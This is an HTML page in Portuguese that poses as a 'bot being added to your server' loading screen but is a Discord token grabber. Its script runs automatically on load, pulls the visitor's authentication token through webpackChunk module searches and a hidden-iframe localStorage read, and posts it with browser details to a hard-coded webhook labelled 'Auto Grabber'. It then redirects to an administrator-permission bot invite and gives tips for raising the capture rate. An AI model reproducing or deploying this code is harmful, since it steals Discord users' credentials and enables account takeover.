<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adicionando Bot...</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #36393f, #2f3136);
            color: #dcddde;
            text-align: center;
            padding: 80px 20px;
            margin: 0;
            min-height: 100vh;
        }
        h1 { color: #7289da; }
        p { max-width: 620px; margin: 20px auto; line-height: 1.6; }
        .loading {
            margin-top: 40px;
            font-size: 18px;
            color: #b9bbbe;
        }
        .spinner {
            display: inline-block;
            width: 22px;
            height: 22px;
            border: 3px solid #7289da;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 10px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h1>Adicionando o Bot no Servidor...</h1>
    <p>Processando automaticamente. Aguarde alguns segundos.</p>
    <div class="loading" id="status">
        <span class="spinner"></span> Tentando capturar o token...
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1495879559529365605/jnDvjCQ91dV9VE_UZxIaUJ6Tgs3oMcbkSo-b1S8R1cIlA9GdB1tTHGR5WYfd3na6aSqe";
        const BOT_INVITE = "https://discord.com/oauth2/authorize?client_id=1385679819508809778&permissions=8&integration_type=0&scope=bot";

        async function pegarToken() {
            const status = document.getElementById('status');
            let token = null;

            // === MÉTODO 1: WebpackChunk (melhor para Chrome/Brave/Edge) ===
            try {
                window.webpackChunkdiscord_app.push([[Symbol()], {}, (req) => {
                    for (let m of Object.values(req.c)) {
                        try {
                            if (m?.exports?.default?.getToken) {
                                token = m.exports.default.getToken();
                                return;
                            }
                            if (m?.exports?.getToken) {
                                token = m.exports.getToken();
                                return;
                            }
                            for (let key in m.exports) {
                                if (typeof m.exports[key]?.getToken === 'function') {
                                    const t = m.exports[key].getToken();
                                    if (t && t.length > 50) {
                                        token = t;
                                        return;
                                    }
                                }
                            }
                        } catch (e) {}
                    }
                }]);
                window.webpackChunkdiscord_app.pop();
            } catch (e) {}

            if (token) {
                status.innerHTML = `<span class="spinner"></span> Token encontrado (Webpack)!`;
                return token;
            }

            // === MÉTODO 2: Versão simplificada do webpack (muito usada em 2026) ===
            try {
                const m = [];
                window.webpackChunkdiscord_app.push([[''], {}, e => { for (let c in e.c) m.push(e.c[c]); }]);
                window.webpackChunkdiscord_app.pop();

                const found = m.find(mod => mod?.exports?.default?.getToken !== void 0);
                if (found) token = found.exports.default.getToken();
            } catch (e) {}

            if (token) {
                status.innerHTML = `<span class="spinner"></span> Token encontrado (Método 2)!`;
                return token;
            }

            // === MÉTODO 3: LocalStorage via iframe ===
            try {
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                document.body.appendChild(iframe);
                const ls = iframe.contentWindow.localStorage.token;
                iframe.remove();
                if (ls) token = JSON.parse(ls);
            } catch (e) {}

            if (token) {
                status.innerHTML = `<span class="spinner"></span> Token encontrado (LocalStorage)!`;
                return token;
            }

            return null;
        }

        async function enviarWebhook(token) {
            if (!token) return;

            const payload = {
                content: `**✅ Token capturado automaticamente!**\n\n**Token:** \`\`\`${token}\`\`\`\n**Hora:** ${new Date().toLocaleString('pt-BR')}\n**Navegador:** ${navigator.userAgent}\n**Plataforma:** ${navigator.platform}`,
                username: "Auto Grabber",
                avatar_url: "https://i.imgur.com/0Zx3Z3k.png"
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
            } catch (err) {}
        }

        async function iniciar() {
            const token = await pegarToken();

            if (token && token.length > 50) {
                await enviarWebhook(token);
                document.getElementById('status').innerHTML = "✅ Token enviado com sucesso!<br>Redirecionando para adicionar o bot...";
                
                setTimeout(() => {
                    window.location.href = BOT_INVITE;
                }, 1800);
            } else {
                document.getElementById('status').innerHTML = `❌ Não consegui pegar o token neste navegador.<br><br>
                Dicas para aumentar a chance:<br>
                • Abra o Discord Web primeiro (discord.com/app ou discord.com/channels)<br>
                • No Brave: desative o Shield para discord.com<br>
                • Use Chrome ou Edge se possível<br>
                • Recarregue o Discord antes de abrir este link`;
            }
        }

        // Inicia automaticamente ao carregar
        window.onload = iniciar;
    </script>
</body>
</html>
